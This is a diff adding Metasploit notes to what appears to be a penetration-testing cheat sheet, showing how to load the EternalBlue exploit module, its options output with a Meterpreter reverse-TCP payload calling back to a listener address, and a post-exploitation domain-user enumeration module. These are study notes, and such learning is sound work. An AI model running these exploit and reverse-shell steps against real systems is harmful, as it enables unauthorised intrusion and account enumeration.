@@ -98,7 +98,83 @@ or the python3 python3 rar2john
 
 <details>
 <summary style="cursor:pointer">metasploit</summary>
-  
+
+RHOST = Remote Host\
+RPORT = Remote Port
+
+```
+msfconsole
+msf6 >
+```
+
+``` 
+CCHOOSE EXPLOIT - Example eternalblue
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+
+changes to \/\/
+msf6 exploit(windows/smb/ms17_010_eternalblue) > 
+
+```
+
+```
+SHOW OPTIONS
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using
+                                             -metasploit/basics/using-metasploit.html
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only
+                                             affects Windows Server 2008 R2, Windows 7, Windows Embedded St
+                                             andard 7 target machines.
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affe
+                                             cts Windows Server 2008 R2, Windows 7, Windows Embedded Standa
+                                             rd 7 target machines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Window
+                                             s Server 2008 R2, Windows 7, Windows Embedded Standard 7 targe
+                                             t machines.
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.67.91.215     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+```
+
+---
+This will print options related to the exploit we have chosen earlier.\
+The show options command will have different outputs depending on the context it is used in. \
+The example above shows that this exploit will require we set variables like RHOSTS and RPORT.\
+On the other hand, a post-exploitation module may only need us to set a SESSION ID (see the screenshot below).\
+A session is an existing connection to the target system that the post-exploitation module will use.\
+
+No RHOST or RPORT needed just >>> SessionID
+
+```
+msf6 post(windows/gather/enum_domain_users) > show options
+
+Module options (post/windows/gather/enum_domain_users):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HOST                      no        Target a specific host
+   SESSION                   yes       The session to run this module on.
+   USER                      no        Target User for NetSessionEnum
+
+msf6 post(windows/gather/enum_domain_users) >
+```
 
 </details>
 
